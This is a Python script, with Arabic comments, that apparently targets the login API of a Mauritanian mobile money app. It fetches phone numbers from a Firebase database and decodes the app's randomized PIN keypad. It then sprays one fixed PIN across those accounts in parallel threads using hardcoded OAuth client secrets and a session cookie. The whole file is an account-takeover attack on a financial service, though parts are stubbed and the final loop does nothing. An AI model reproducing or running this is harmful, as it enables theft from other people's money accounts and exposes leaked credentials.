import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event

session = requests.Session()

BASE_URL = "https://22201.tagpay.fr/api/client/v1"
DB_URL = "https://masrviblock-default-rtdb.firebaseio.com/numbers.json"

COMMON_HEADERS = {
    'User-Agent': "Masrvi / 25.09.6713(6713); com.google.android.packageinstaller; (samsung; SM-E055F; Android; 15)",
    'Accept': "application/json, text/plain, */*",
    'Accept-Encoding': "gzip",
    'Content-Type': "application/json",
    'Cookie': "PHPSESSID=js8chf66dl4qig1l6q9ti8f6b8"
}

# =========================
# إيقاف فوري
# =========================
stop_event = Event()

# 🔹 التوكن
def get_token():
    payload = {
        "grant_type": "client_credentials",
        "client_id": "80b60e90eb4c6fafe349f03614f72047",
        "client_secret": "66c0d0406f9502121f002d936485a3ddb2ec633ff78c04f770d393941e59e311",
        "scope": ["pincode_check"]
    }

    res = session.post(
        f"{BASE_URL}/oauth2/token",
        json=payload,
        headers=COMMON_HEADERS
    )

    return res.json().get("access_token")


# 🔹 الصور
def get_images(token, num):

    if stop_event.is_set():
        return [], None

    headers = COMMON_HEADERS.copy()
    headers["authorization"] = f"Bearer {token}"
    headers["accept-language"] = "ar_MR"

    res = session.get(
        f"{BASE_URL}/keyboard/222{num}",
        params={
            'font': "DMSans-Medium",
            'width': "124",
            'fontSize': "62"
        },
        headers=headers
    )

    data = res.json()

    return data.get("images", []), data.get("id")


# =========================
# قاعدة البيانات
# =========================
database = {
    0: "...",
    1: "...",
    2: "...",
    3: "...",
    4: "...",
    5: "...",
    6: "...",
    7: "...",
    8: "...",
    9: "..."
}

reverse_db = {v: k for k, v in database.items()}


def extract_fast(user_images):
    results = {}

    for idx, img in enumerate(user_images):
        num = reverse_db.get(img)

        if num is not None:
            results[num] = idx

    return results


def build_password(pin, results_map):

    digits = [int(x) for x in pin]

    indices = [
        results_map.get(d)
        for d in digits
    ]

    if None in indices:
        return None

    return ";".join(map(str, indices))


# =========================
# المحاولة
# =========================
def attempt(i, num, pin):

    if stop_event.is_set():
        return False

    try:

        token = get_token()

        if not token:
            return False

        images, user_id = get_images(
            token,
            num
        )

        if not images:
            return False

        results_map = extract_fast(
            images
        )

        password_str = build_password(
            pin,
            results_map
        )

        if not password_str:
            return False

        payload = {
            "grant_type": "password",
            "client_id": "80b60e90eb4c6fafe349f03614f72047",
            "client_secret": "66c0d0406f9502121f002d936485a3ddb2ec633ff78c04f770d393941e59e311",
            "scope": [
                "pincode_check",
                "otp_check"
            ],
            "username": user_id,
            "password": password_str,
            "install_id": "75283595-3b34-42e6-8b2a-b44b8cf47e85"
        }

        res = session.post(
            f"{BASE_URL}/oauth2/token",
            json=payload,
            headers=COMMON_HEADERS
        )

        data = res.json()

        if (
            "error" in data
            and data["error"].get("code") == 72614
        ):
            stop_event.set()
            return False

        return "access_token" in data

    except Exception:
        return False


# =========================
# جلب الأرقام
# =========================
def get_numbers():

    try:

        res = session.get(
            DB_URL,
            timeout=10
        )

        data = res.json()

        if not data:
            return []

        return data.get(
            "numbers",
            []
        )

    except Exception:
        return []


numbers_list = get_numbers()

pin = "9309"

# =========================
# التشغيل
# =========================
for num in numbers_list:

    stop_event.clear()

    success = False

    with ThreadPoolExecutor(
        max_workers=50
    ) as executor:

        futures = [
            executor.submit(
                attempt,
                i,
                num,
                pin
            )
            for i in range(7)
        ]

        for future in as_completed(
            futures
        ):

            if stop_event.is_set():
                break

            if future.result():

                success = True

                stop_event.set()

                break
if __name__ == "__main__":
    while True:
        # تشغيل الكود الرئيسي
        pass
